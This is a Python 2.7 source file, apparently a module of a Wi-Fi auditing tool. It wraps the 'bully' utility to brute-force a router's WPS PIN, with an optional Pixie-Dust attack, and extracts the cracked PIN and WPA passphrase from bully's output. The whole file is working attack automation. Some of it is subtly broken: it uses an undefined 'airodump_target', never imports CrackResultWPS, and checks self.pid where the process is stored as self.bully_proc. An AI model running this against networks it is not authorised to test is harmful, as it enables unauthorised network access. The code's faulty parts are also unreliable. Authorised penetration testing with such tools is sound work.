#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

from Attack import Attack
from Airodump import Airodump
from Color import Color
from Timer import Timer
from Process import Process
from Configuration import Configuration

import os, time, re
from threading import Thread

class Bully(Attack):
    def __init__(self, target, pixie=False):
        super(Bully, self).__init__(target)
        self.consecutive_lockouts = self.consecutive_timeouts = self.consecutive_noassoc = 0
        self.pins_attempted = 0
        self.state = "{O}Waiting for beacon{W}"
        self.m_state = None
        self.start_time = time.time()

        self.cracked_pin = self.cracked_key = self.cracked_bssid = self.cracked_essid = None
        self.crack_result = None

        self.target = target
        self.pixie = pixie

        self.cmd = [
            "stdbuf", "-o0", # No buffer. See https://stackoverflow.com/a/40453613/7510292
            "bully",
            "--bssid", target.bssid,
            "--channel", target.channel,
            "--detectlock", # Detect WPS lockouts unreported by AP
            "--force",
            "-v", "4"
        ]
        #self.cmd.extend(["-p", "80246212", "--force", "--bruteforce"])
        if self.pixie:
            self.cmd.append("--pixiewps")
        self.cmd.append(Configuration.interface)

        self.bully_proc = None
        self.run()
        self.stop()

    def attack_type(self):
        return "Pixie-Dust" if self.pixie else "PIN Attack"

    def run(self):
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wash=True,
                      output_file_prefix='wps_pin') as airodump:
            # Wait for target
            Color.clear_entire_line()
            Color.pattack("WPS",
                    self.target,
                    self.attack_type(),
                    "Waiting for target to appear...")
            self.target = self.wait_for_target(airodump)

            # Start bully
            self.bully_proc = Process(self.cmd,
                stderr=Process.devnull(),
                bufsize=0,
                cwd=Configuration.temp())
            t = Thread(target=self.parse_line_thread)
            t.daemon = True
            t.start()
            try:
                while self.bully_proc.poll() is None:
                    try:
                        self.target = self.wait_for_target(airodump)
                    except Exception as e:
                        Color.clear_entire_line()
                        Color.pattack("WPS",
                                self.target,
                                self.attack_type(),
                                "{R}failed: {O}%s{W}" % e)
                        Color.pl("")
                        self.stop()
                        break
                    Color.clear_entire_line()
                    Color.pattack("WPS",
                            self.target,
                            self.attack_type(),
                            self.get_status())
                    time.sleep(0.5)
            except KeyboardInterrupt as e:
                self.stop()
                raise e
            except Exception as e:
                self.stop()
                raise e

        if self.crack_result is None:
            Color.clear_entire_line()
            Color.pattack("WPS",
                    self.target,
                    self.attack_type(),
                    "{R}Failed{W}\n")

    def running_time(self):
        return int(time.time() - self.start_time)

    def get_status(self):
        result = self.state
        result += " ({C}runtime:%s{W}" % Timer.secs_to_str(self.running_time())
        result += " {G}tries:%d{W}" % self.pins_attempted
        result += " {O}failures:%d{W}" % (self.consecutive_timeouts + self.consecutive_noassoc)
        result += " {R}lockouts:%d{W}" % self.consecutive_lockouts
        result += ")"
        return result

    def parse_line_thread(self):
        for line in iter(self.bully_proc.pid.stdout.readline, b""):
            if line == "": continue
            line = line.replace("\r", "").replace("\n", "").strip()
            if self.parse_line(line): break # Cracked

    def parse_line(self, line):
        # [+] Got beacon for 'Green House 5G' (30:85:a9:39:d2:1c)
        got_beacon = re.compile(r".*Got beacon for '(.*)' \((.*)\)").match(line)
        if got_beacon:
            # group(1)=ESSID, group(2)=BSSID
            self.state = "Got beacon"

        # [+] Last State = 'NoAssoc'   Next pin '48855501'
        last_state = re.compile(r".*Last State = '(.*)'\s*Next pin '(.*)'").match(line)
        if last_state:
            # group(1)=result, group(2)=PIN
            result = "Start" # last_state.group(1)
            pin = last_state.group(2)
            self.state = "Trying PIN:{C}%s{W}" % pin

        # [+] Rx(  M5  ) = 'Pin1Bad'   Next pin '35565505'
        # [+] Tx( Auth ) = 'Timeout'   Next pin '80241263'
        rx_m = re.compile(r".*[RT]x\(\s*(.*)\s*\) = '(.*)'\s*Next pin '(.*)'").match(line)
        if rx_m:
            # group(1)=M3/M5, group(2)=result, group(3)=PIN
            self.m_state = rx_m.group(1)
            result = rx_m.group(2) # NoAssoc, WPSFail, Pin1Bad, Pin2Bad
            if result in ["Pin1Bad", "Pin2Bad"]:
                self.pins_attempted += 1
                self.consecutive_lockouts = 0 # Reset lockout count
                self.consecutive_timeouts = 0 # Reset timeout count
                self.consecutive_noassoc = 0 # Reset timeout count
                result = "{G}%s{W}" % result
            elif result == "Timeout":
                self.consecutive_timeouts += 1
                result = "{O}%s{W}" % result
            elif result == "NoAssoc":
                self.consecutive_noassoc += 1
                result = "{O}%s{W}" % result
            else:
                result = "{R}%s{W}" % result
            pin = rx_m.group(3)
            self.state = "Trying PIN:{C}%s{W} (%s)" % (pin, result)

        # [!] WPS lockout reported, sleeping for 43 seconds ...
        lock_out = re.compile(r".*WPS lockout reported, sleeping for (\d+) seconds").match(line)
        if lock_out:
            sleeping = lock_out.group(1)
            self.state = "{R}WPS Lock-out: {O}Waiting %s seconds{W}" % sleeping
            self.consecutive_lockouts += 1

        # [Pixie-Dust] WPS pin not found
        pixie_re = re.compile(r".*\[Pixie-Dust\] WPS pin not found").match(line)
        if pixie_re:
            self.state = "{R}Failed{W}"


        # [+] Running pixiewps with the information, wait ...
        pixie_re = re.compile(r".*Running pixiewps with the information").match(line)
        if pixie_re:
            self.state = "{G}Running pixiewps...{W}"

        # [*] Pin is '80246213', key is 'password'
        pin_key_re = re.compile(r"^\s*Pin is '(\d*)', key is '(.*)'\s*$").match(line)
        if pin_key_re:
            self.cracked_pin = pin_key_re.group(1)
            self.cracked_key = pin_key_re.group(2)

        #        PIN   : '80246213'
        pin_re = re.compile(r"^\s*PIN\s*:\s*'(.*)'\s*$").match(line)
        if pin_re: self.cracked_pin = pin_re.group(1)

        #        KEY   : 'password'
        key_re = re.compile(r"^\s*KEY\s*:\s*'(.*)'\s*$").match(line)
        if key_re: self.cracked_key = key_re.group(1)

        #warn_re = re.compile(r"\[\!\]\s*(.*)$").match(line)
        #if warn_re: self.state = "{O}%s{W}" % warn_re.group(1)

        if not self.crack_result and self.cracked_pin and self.cracked_key:
            Color.clear_entire_line()
            Color.pattack("WPS", self.target, "Pixie-Dust", "{G}successfully cracked WPS PIN and PSK{W}\n")
            self.crack_result = CrackResultWPS(
                    airodump_target.essid,
                    airodump_target.bssid,
                    self.cracked_pin,
                    self.cracked_key)
            return True
        else:
            return False

    def stop(self):
        if hasattr(self, "pid") and self.pid and self.pid.poll() == None:
            self.pid.interrupt()

    def __del__(self):
        self.stop()
